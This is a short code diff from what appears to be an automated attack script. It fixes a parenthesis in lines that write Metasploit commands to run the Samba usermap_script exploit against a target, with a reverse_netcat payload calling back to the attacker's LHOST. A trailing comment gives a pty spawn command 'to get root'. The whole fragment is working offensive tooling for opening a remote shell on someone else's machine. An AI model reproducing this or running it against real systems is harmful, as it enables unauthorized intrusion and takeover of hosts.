@@ -143,7 +143,7 @@ def check_139_lin(target):
   saveNetRc('use exploit/multi/samba/usermap_script\n')
   saveNetRc('set RHOST ' + target + '\n')
   saveNetRc('set PAYLOAD cmd/unix/reverse_netcat\n')
-  saveNetRc('set LHOST ' + str(elhost() + '\n')
+  saveNetRc('set LHOST ' + str(elhost()) + '\n')
   saveNetRc('run\n') # TODO: python -c 'import pty;pty.spawn("/bin/bash")' # to get root
 
 # modules for SMB
